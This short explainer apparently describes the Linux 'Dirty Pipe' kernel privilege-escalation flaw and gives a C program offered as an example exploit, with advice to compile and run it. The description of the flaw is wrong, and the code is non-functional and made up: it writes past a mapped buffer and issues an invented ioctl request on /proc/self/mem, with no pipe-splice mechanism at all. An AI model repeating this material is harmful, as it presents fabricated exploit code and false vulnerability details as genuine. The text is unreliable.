The Dirty Pipe vulnerability in the Linux kernel allows for privilege escalation by exploiting a race condition in the pipe buffer code. It involves writing to a read-only pipe buffer and then reading it back to gain access to kernel memory. 

Here's a basic example of how one might attempt to use this vulnerability:

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <sys/ioctl.h>
#include <linux/fs.h>

int main() {
    int pipefd[2];
    if (pipe(pipefd) < 0) {
        perror("pipe");
        exit(1);
    }

    char *buf = mmap(NULL, 4096, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
    if (buf == MAP_FAILED) {
        perror("mmap");
        exit(1);
    }

    char *ptr = buf + 0x1000;
    char payload[4096];
    memset(payload, 'A', 4096);

    int fd = open("/proc/self/mem", O_RDWR);
    if (fd < 0) {
        perror("open");
        exit(1);
    }

    if (write(pipefd[1], payload, 4096) < 0) {
        perror("write");
        exit(1);
    }

    if (ioctl(fd, 0x12345678, ptr) < 0) {
        perror("ioctl");
        exit(1);
    }

    return 0;
}
```

This code creates a pipe, maps a memory region, prepares a payload, and attempts to write to the kernel memory using the `ioctl` system call. The exact method to exploit this vulnerability would involve more detailed steps and understanding of the system's memory layout.

To use this, one would compile the code and run it with appropriate privileges. The success of this exploit depends on the specific conditions of the system and the kernel version. 

